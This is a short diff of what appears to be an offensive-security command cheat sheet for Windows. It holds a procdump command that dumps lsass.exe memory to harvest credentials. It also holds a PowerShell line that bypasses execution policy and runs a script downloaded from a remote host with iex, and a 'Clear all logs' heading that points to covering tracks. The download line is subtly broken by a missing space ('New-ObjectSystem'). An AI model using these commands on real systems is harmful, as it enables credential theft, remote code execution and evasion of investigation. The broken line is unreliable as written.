@@ -1,4 +1,4 @@
-Live sys internals (ps)
+Live sys internals
 ```
 net use s: \\live.sysinternals.com\tools;
 s:\procdump64.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1'
@@ -6,7 +6,8 @@ s:\procdump64.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1'
 
 Choco install
 ```
-Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-ObjectSystem.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
+Set-ExecutionPolicy Bypass -Scope Process -Force; 
+iex ((New-ObjectSystem.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
 ```
 
 Clear all logs
